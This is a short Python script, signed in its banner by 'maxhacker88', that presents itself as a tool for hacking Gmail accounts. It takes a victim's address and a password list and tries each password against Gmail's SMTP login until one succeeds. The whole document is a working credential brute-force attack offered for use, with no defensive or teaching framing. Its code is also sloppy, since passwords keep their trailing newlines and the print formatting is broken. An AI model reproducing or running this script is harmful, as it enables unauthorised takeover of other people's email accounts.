print("___________________maxhacker88_____________________")
print("            powerd py mohamed yousef               ")
print("    search about me in google ==== Maxhacker88     ")
print("     visit my facebook == fb.com/maxhacker88       ")
print("        visit my instgram = maxhacker88            ")
print("hacking gmail account by maxhacker88 the new script")


import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("input your victem:")
passwfile = raw_input("input a passwordlist: ")
passwfile = open(passwfile, "r")

for password in passwfile :
     try :
                smtpserver.login(user, password)
                print ("[+] password found ===> %s ") % password
                break;

     except  smtplib.SMTPAuthenticationError:
                 print ("[!] password not found ===> %s ") % password